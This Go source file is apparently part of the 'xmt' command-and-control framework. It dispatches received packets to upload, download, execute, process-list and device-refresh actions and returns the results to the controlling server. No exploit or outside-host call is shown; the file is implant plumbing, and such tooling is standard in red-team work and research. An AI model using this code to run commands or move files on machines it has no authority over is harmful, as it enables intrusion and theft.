package c2

import (
	"fmt"

	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/data"
	"github.com/iDigitalFlame/xmt/xmt/device"
)

const (
	Upload      = upload(true)
	Refresh     = refresh(false)
	Execute     = execute(true)
	Download    = download(true)
	ProcessList = processList(false)
)

var (
	// FragMax is the max amount of bytes written
	// during Action processing before being split into
	// Fragments.
	FragMax = 4096
)

type mux bool
type refresh bool

// Action is an interface that defines functions for handeling
// and processing Packet command functions.
type Action interface {
	Thread() bool
	//Result(*Session, data.Reader) (string, error)
	Execute(*Session, data.Reader, data.Writer) error
}

func (refresh) Thread() bool {
	return false
}
func (m mux) Handle(s *Session, p *com.Packet) {
	if p == nil || s == nil {
		return
	}
	if m {
		s.controller.Log.Trace("[%s:%s:Mux] Received packet \"%s\"...", s.parent.name, s.ID, p.String())
		m.server(s, p)
	} else {
		s.controller.Log.Trace("[%s:Mux] Received packet \"%s\"...", s.ID, p.String())
		m.client(s, p)
	}
}
func (m mux) client(s *Session, p *com.Packet) {
	switch p.ID {
	case MsgUpload:
		Process(s, p, Upload)
	case MsgRefresh:
		Process(s, p, Refresh)
	case MsgExecute:
		Process(s, p, Execute)
	case MsgDownload:
		Process(s, p, Download)
	case MsgProcessList:
		Process(s, p, ProcessList)
	case MsgHello, MsgPing, MsgSleep, MsgRegistered:
		return
	}
}
func (m mux) server(s *Session, p *com.Packet) {
	fmt.Printf("srv %s: %s\n", s, p)
	if p.Flags&com.FlagError != 0 {
		v, _ := p.StringVal()
		fmt.Printf("error: %s\n", v)
	} else {

		b := make([]byte, 8096)
		n, err := p.Read(b)
		fmt.Printf("Payload %d %s:\n%s\n", n, err, b)
	}
}

// Do runs the Execute function of the supplied Action and sends the
// results back to the provided Session via Packet Stream.
func Do(s *Session, p *com.Packet, a Action) {
	o := &com.Stream{
		ID:     MsgResult,
		Job:    p.Job,
		Max:    FragMax,
		Device: p.Device,
	}
	o.Writer(s)
	if err := a.Execute(s, p, o); err != nil {
		o.Clear()
		o.Flags |= com.FlagError
		o.WriteString(err.Error())
	}
	o.Close()
}

// Process runs the Execute function of the supplied Action and sends the
// result to the supplied Session.
func Process(s *Session, p *com.Packet, a Action) {
	if a.Thread() {
		go Do(s, p, a)
	} else {
		Do(s, p, a)
	}
}
func (refresh) Execute(_ *Session, _ data.Reader, w data.Writer) error {
	if err := device.Local.Refresh(); err != nil {
		return err
	}
	return device.Local.MarshalStream(w)
}
